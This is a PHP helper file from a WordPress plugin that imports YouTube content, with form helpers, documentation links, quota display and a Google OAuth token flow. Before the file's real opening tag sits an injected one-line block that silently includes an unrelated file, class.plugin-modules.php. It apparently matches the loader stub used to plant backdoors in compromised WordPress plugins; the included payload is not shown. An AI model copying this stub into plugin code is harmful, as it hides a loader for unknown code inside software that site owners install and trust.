<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * Displays checked argument in checkbox
 * 
 * @param bool $val
 * @param bool $echo
 */
function cbc_check( $val, $echo = true ){
	$checked = '';
	if( is_bool( $val ) && $val ){
		$checked = ' checked="checked"';
	}
	if( $echo ){
		echo $checked;
	}else{
		return $checked;
	}
}

/**
 * Displays a style="display:hidden;" if passed $val is bool and false
 * 
 * @param bool $val
 * @param string $before
 * @param string $after
 * @param bool $echo
 */
function cbc_hide( $val, $compare = false, $before = ' style="', $after = '"', $echo = true ){
	$output = '';
	if( $val == $compare ){
		$output .= $before . 'display:none;' . $after;
	}
	if( $echo ){
		echo $output;
	}else{
		return $output;
	}
}

/**
 * Display select box
 * 
 * @param array $args - see $defaults in function
 * @param bool $echo
 */
function cbc_select( $args = array(), $echo = true ){
	$defaults = array( 
			'options' => array(), 
			'name' => false, 
			'id' => false, 
			'class' => '', 
			'selected' => false, 
			'use_keys' => true 
	);
	
	$o = wp_parse_args( $args, $defaults );
	
	if( ! $o[ 'id' ] ){
		$output = sprintf( '<select name="%1$s" id="%1$s" class="%2$s" autocomplete="off">', $o[ 'name' ], $o[ 'class' ] );
	}else{
		$output = sprintf( '<select name="%1$s" id="%2$s" class="%3$s" autocomplete="off">', $o[ 'name' ], $o[ 'id' ], $o[ 'class' ] );
	}
	
	foreach( $o[ 'options' ] as $val => $text ){
		$opt = '<option value="%1$s"%2$s>%3$s</option>';
		
		$value = $o[ 'use_keys' ] ? $val : $text;
		$c = $o[ 'use_keys' ] ? $val == $o[ 'selected' ] : $text == $o[ 'selected' ];
		$checked = $c ? ' selected="selected"' : '';
		$output .= sprintf( $opt, $value, $checked, $text );
	}
	
	$output .= '</select>';
	
	if( $echo ){
		echo $output;
	}
	
	return $output;
}

/**
 * A list of allowed bulk actions implemented by the plugin
 */
function cbc_actions(){
	$actions = array( 
			'cbc_thumbnail' => __( 'Import thumbnails', 'cbc_video' ) 
	);
	
	return $actions;
}

/**
 * Returns contextual help content from file
 * 
 * @param string $file - partial file name
 */
function cbc_get_contextual_help( $file ){
	if( ! $file ){
		return false;
	}
	$file_path = CBC_PATH . 'views/help/' . $file . '.html.php';
	if( is_file( $file_path ) ){
		ob_start();
		include ( $file_path );
		$help_contents = ob_get_contents();
		ob_end_clean();
		return $help_contents;
	}else{
		return false;
	}
}

function cbc_link( $path, $medium = 'doc_link' ){
	$base = 'https://wpythub.com/';
	$vars = array( 
			'utm_source' => 'plugin', 
			'utm_medium' => $medium, 
			'utm_campaign' => 'cbc-youtube-plugin' 
	);
	$q = http_build_query( $vars );
	return $base . trailingslashit( $path ) . '?' . $q;
}

function cbc_docs_link( $path ){
	return cbc_link( 'documentation/' . trailingslashit( $path ), 'doc_link' );
}

/**
 * Displays a message regarding YouTube quota usage
 * 
 * @param bool $echo
 */
function cbc_yt_quota_message( $echo = true ){
	$stats = get_option( 'cbc_daily_yt_units', array( 
			'day' => - 1, 
			'count' => 0 
	) );
	$units = 50000000;
	$used = $stats[ 'count' ] > $units ? $units : $stats[ 'count' ];
	$percent = $used * 100 / $units;
	
	$message = sprintf( __( 'Estimated quota units used today: %s (%s of %s)', 'cbc_video' ), number_format_i18n( $used ), number_format_i18n( $percent, 2 ) . '%', number_format_i18n( $units ) );
	if( $echo ){
		echo $message;
	}
	return $message;
}

/**
 * YouTube OAuth functions
 */

/**
 * Displays the link that begins OAuth authorization
 * 
 * @param string $text
 */
function cbc_show_oauth_link( $text = '', $echo = true ){
	if( empty( $text ) ){
		$text = __( 'Grant plugin access', 'cbc_video' );
	}
	
	$options = cbc_get_yt_oauth_details();
	if( empty( $options[ 'client_id' ] ) || empty( $options[ 'client_secret' ] ) ){
		return;
	}else{
		if( ! empty( $options[ 'token' ][ 'value' ] ) ){
			$nonce = wp_create_nonce( 'cbc-revoke-oauth-token' );
			$url = menu_page_url( 'cbc_settings', false ) . '&unset_token=true&cbc_nonce=' . $nonce . '#cbc-settings-auth-options';
			printf( '<a href="%s" class="button">%s</a>', $url, __( 'Revoke OAuth access', 'cbc_video' ) );
			return;
		}
	}
	
	$endpoint = 'https://accounts.google.com/o/oauth2/auth';
	$parameters = array( 
			'response_type' => 'code', 
			'client_id' => $options[ 'client_id' ], 
			'redirect_uri' => cbc_get_oauth_redirect_uri(), 
			'scope' => 'https://www.googleapis.com/auth/youtube.readonly', 
			'state' => wp_create_nonce( 'ccb-youtube-oauth-grant' ), 
			'access_type' => 'offline', 
			'approval_prompt' => 'force' 
	);
	
	$url = $endpoint . '?' . http_build_query( $parameters );
	
	$anchor = sprintf( '<a href="%s">%s</a>', $url, $text );
	if( $echo ){
		echo $anchor;
	}
	return $anchor;
}

/**
 * Outputs a link that allows users to clear OAuth credentials
 * 
 * @param string $text
 * @param string $echo
 * @return void|string
 */
function cbc_clear_oauth_credentials_link( $text = '', $echo = true ){
	if( empty( $text ) ){
		$text = __( 'Clear OAuth credentials', 'cbc_video' );
	}
	
	$options = cbc_get_yt_oauth_details();
	if( empty( $options[ 'client_id' ] ) || empty( $options[ 'client_secret' ] ) ){
		return;
	}
	
	$nonce = wp_create_nonce( 'cbc-clear-oauth-token' );
	$url = menu_page_url( 'cbc_settings', false ) . '&clear_oauth=true&cbc_nonce=' . $nonce . '#cbc-settings-auth-options';
	$output = sprintf( '<a href="%s" class="button">%s</a>', $url, $text );
	
	if( $echo ){
		echo $output;
	}
	
	return $output;
}

/**
 * Returns the OAuth redirect URL
 */
function cbc_get_oauth_redirect_uri(){
	$url = get_admin_url();
	return $url;
}

/**
 * Get authentification token if request is response returned from YouTube
 */
function cbc_check_youtube_auth_code(){
	if( isset( $_GET[ 'code' ] ) && isset( $_GET[ 'state' ] ) ){
		if( wp_verify_nonce( $_GET[ 'state' ], 'ccb-youtube-oauth-grant' ) ){
			$options = cbc_get_yt_oauth_details();
			$fields = array( 
					'code' => $_GET[ 'code' ], 
					'client_id' => $options[ 'client_id' ], 
					'client_secret' => $options[ 'client_secret' ], 
					'redirect_uri' => cbc_get_oauth_redirect_uri(), 
					'grant_type' => 'authorization_code' 
			);
			$token_url = 'https://accounts.google.com/o/oauth2/token';
			
			$response = wp_remote_post( $token_url, array( 
					'method' => 'POST', 
					'timeout' => 45, 
					'redirection' => 5, 
					'httpversion' => '1.0', 
					'blocking' => true, 
					'headers' => array(), 
					'body' => $fields, 
					'cookies' => array() 
			) );
			
			if( ! is_wp_error( $response ) ){
				$response = json_decode( wp_remote_retrieve_body( $response ), true );
				
				$token = false;
				$refresh_token = false;
				
				if( isset( $response[ 'access_token' ] ) ){
					$token = array( 
							'value' => $response[ 'access_token' ], 
							'valid' => $response[ 'expires_in' ], 
							'time' => time() 
					);
				}
				
				if( isset( $response[ 'refresh_token' ] ) ){
					$refresh_token = $response[ 'refresh_token' ];
				}
				
				if( $token || $refresh_token ){
					cbc_update_yt_oauth( false, false, $token, $refresh_token );
				}
			}
			
			wp_redirect( html_entity_decode( menu_page_url( 'cbc_settings', false ) ) . '#cbc-settings-auth-options' );
			die();
		}
	}
}
add_action( 'admin_init', 'cbc_check_youtube_auth_code' );

/**
 * Returns all playlists created by currently authenticated user using OAuth.
 * page_token - YT API 3 page token for pagination
 */
function cbc_yt_api_get_user_playlists( $page_token = '', $per_page = 20 ){
	__load_youtube_api_class();
	$q = new YouTube_API_Query( $per_page );
	$playlists = $q->get_user_playlists( $page_token );
	
	$page_info = $q->get_list_info();
	
	return array( 
			'items' => $playlists, 
			'page_info' => $page_info 
	);
}

/**
 * Returns all channels for currently authenticated used using OAuth.
 * page_token - YT API 3 page token for pagination
 */
function cbc_yt_api_get_user_channels( $page_token = '', $per_page = 20 ){
	__load_youtube_api_class();
	$q = new YouTube_API_Query( $per_page );
	$channels = $q->get_user_channels( $page_token );
	
	$page_info = $q->get_list_info();
	
	return array( 
			'items' => $channels, 
			'page_info' => $page_info 
	);
}

/**
 * Returns all subscriptions for currently authenticated used using OAuth.
 * page_token - YT API 3 page token for pagination
 */
function cbc_yt_api_get_user_subscriptions( $page_token = '', $per_page = 20 ){
	__load_youtube_api_class();
	$q = new YouTube_API_Query( $per_page );
	$channels = $q->get_user_subscriptions( $page_token );
	
	$page_info = $q->get_list_info();
	
	return array( 
			'items' => $channels, 
			'page_info' => $page_info 
	);
}

/**
 * Outputs the autoimport URL for conditional importing
 * 
 * @param boolean $include_field
 * @param boolean $echo
 * @return string
 */
function cbc_autoimport_uri( $echo = true ){
	$options = cbc_get_settings();
	$output = add_query_arg( array( 
			'cbc_autoimport' => $options[ 'autoimport_param' ] 
	), trailingslashit( get_home_url() ) );
	
	if( $echo ){
		echo $output;
	}
	
	return $output;
}
